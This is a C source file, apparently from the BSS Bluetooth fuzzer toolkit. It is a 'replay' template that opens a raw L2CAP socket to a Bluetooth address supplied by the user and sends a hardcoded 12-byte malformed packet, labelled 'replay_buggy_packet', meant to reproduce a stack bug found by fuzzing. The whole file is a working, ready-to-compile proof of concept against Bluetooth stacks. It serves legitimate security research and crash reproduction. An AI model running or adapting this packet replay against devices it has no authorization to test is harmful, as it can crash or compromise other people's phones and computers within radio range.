/*	BSS Replay packet template 				*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*								*/
/*	Modify this file, and type 'make' in this directory	*/
/*	Then : ./replay_l2cap_packet <BT_ADDR>			*/

/* Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		12
char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";

/**
 * @brief Main entry point for sending an L2CAP (Logical Link Control and Adaptation Protocol) packet via Bluetooth.
 * 
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line arguments; expects the Bluetooth address as the first argument.
 * 
 * This function sets up a raw Bluetooth socket, binds it, and connects it to the specified Bluetooth address.
 * It then sends a predefined packet over this connection and prints the sent packet in hexadecimal format.
 * If any operation fails, the function will print an error message and exit the program.
 * 
 * @return Exit status of the program; EXIT_SUCCESS on successful execution, otherwise a failure status.
 */
int main(int argc, char **argv)
{
	struct sockaddr_l2 bt_address;
	int bluetooth_socket, bytes_sent, index;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((bluetooth_socket = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&bt_address, 0, sizeof(bt_address));
	bt_address.l2_family = AF_BLUETOOTH;

	if (bind(bluetooth_socket, (struct sockaddr *) &bt_address, sizeof(bt_address)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &bt_address.l2_bdaddr);
	
	if (connect(bluetooth_socket, (struct sockaddr *) &bt_address, sizeof(bt_address)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if( (bytes_sent = send(bluetooth_socket, replay_buggy_packet, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", bytes_sent);
	}

	printf("Buffer:\t");
	for(index = 0; index < bytes_sent; index++)
		printf("%.2X ", (unsigned char) replay_buggy_packet[index]);
	printf("\n");

	close(bluetooth_socket);
	return EXIT_SUCCESS;
}
